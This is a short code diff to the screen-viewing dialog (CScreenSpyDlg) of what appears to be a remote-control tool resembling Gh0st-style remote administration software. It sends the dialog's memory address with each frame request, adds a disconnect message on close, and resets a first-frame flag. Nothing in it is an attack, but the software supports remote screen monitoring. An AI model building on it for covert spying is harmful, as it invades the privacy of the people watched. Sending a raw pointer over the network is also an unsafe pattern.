@@ -129,8 +129,10 @@ CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, Server* IOCPServer, CONTEXT_OBJECT* C
 
 VOID CScreenSpyDlg::SendNext(void)
 {
-    BYTE	bToken = COMMAND_NEXT;
-    m_ContextObject->Send2Client(&bToken, 1);
+    BYTE	bToken[32] = { COMMAND_NEXT };
+    uint64_t dlg = (uint64_t)this;
+    memcpy(bToken+1, &dlg, sizeof(uint64_t));
+    m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 
@@ -284,6 +286,7 @@ VOID CScreenSpyDlg::OnClose()
         m_aviFile = "";
         m_aviStream.Close();
     }
+    if (SayByeBye()) Sleep(500);
     CancelIO();
     // 恢复鼠标状态
     SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
@@ -344,6 +347,7 @@ VOID CScreenSpyDlg::OnReceiveComplete()
     }
     case TOKEN_BITMAPINFO: {
         SAFE_DELETE(m_BitmapInfor_Full);
+        m_bIsFirst = TRUE;
         const ULONG	ulBitmapInforLength = sizeof(BITMAPINFOHEADER);
         m_BitmapInfor_Full = (BITMAPINFO*) new BYTE[ulBitmapInforLength];
         m_ContextObject->InDeCompressedBuffer.CopyBuffer(m_BitmapInfor_Full, ulBitmapInforLength, 1);
